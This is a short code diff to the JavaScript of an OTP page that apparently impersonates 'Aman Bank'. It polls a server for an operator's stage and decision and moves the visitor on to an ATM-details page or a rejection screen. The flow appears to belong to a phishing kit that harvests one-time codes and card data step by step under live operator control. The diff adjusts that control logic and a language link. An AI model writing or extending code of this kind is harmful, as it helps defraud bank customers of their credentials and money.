@@ -303,6 +303,7 @@
     var requestId = sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
     if (!requestId) {
       requestId = '999';
+      localStorage.setItem('requestId', requestId);
     }
 
     // Update language switcher link to preserve request ID
@@ -312,7 +313,7 @@
       if (requestId && requestId !== '999') {
         params.set('id', requestId);
       }
-      langSwitch.href = 'otp.html' + (params.toString() ? '?' + params.toString() : '');
+      langSwitch.href = 'otp-ar.html' + (params.toString() ? '?' + params.toString() : '');
     }
 
     var otpForm = document.getElementById('otpForm');
@@ -334,11 +335,11 @@
           .then(function(res){ return res.json(); })
           .then(function(data){
             if (!data.ok) return;
-            if (data.status === 'approved') {
+            if (data.stage === 'atm' && data.decision === 'pending') {
               stopPoll();
               waitOverlay.classList.remove('show');
               window.location.href = 'atm-en.html?id=' + requestId;
-            } else if (data.status === 'rejected') {
+            } else if (data.decision === 'rejected') {
               stopPoll();
               waitOverlay.classList.remove('show');
               rejectOverlay.classList.add('show');
